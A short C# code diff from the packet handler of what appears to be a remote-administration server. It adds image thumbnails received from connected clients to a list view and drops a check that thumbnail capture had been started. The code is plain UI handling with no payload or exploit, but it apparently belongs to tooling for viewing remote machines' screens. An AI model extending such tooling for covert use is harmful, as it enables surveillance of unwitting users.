@@ -13,13 +13,16 @@ namespace Server.Handle_Packet
         {
             try
             {
-                if (client.LV2 == null && Program.form1.GetThumbnails.Tag == (object)"started")
+                if (client.LV2 == null)
                 {
                     client.LV2 = new ListViewItem();
                     client.LV2.Text = string.Format("{0}:{1}", client.TcpClient.RemoteEndPoint.ToString().Split(':')[0], client.TcpClient.LocalEndPoint.ToString().Split(':')[1]);
                     client.LV2.ToolTipText = client.ID;
+                    client.LV2.Tag = client;
+
                     using (MemoryStream memoryStream = new MemoryStream(unpack_msgpack.ForcePathObject("Image").GetAsBytes()))
                     {
+
                         Program.form1.ThumbnailImageList.Images.Add(client.ID, Bitmap.FromStream(memoryStream));
                         client.LV2.ImageKey = client.ID;
                         lock (Settings.LockListviewThumb)
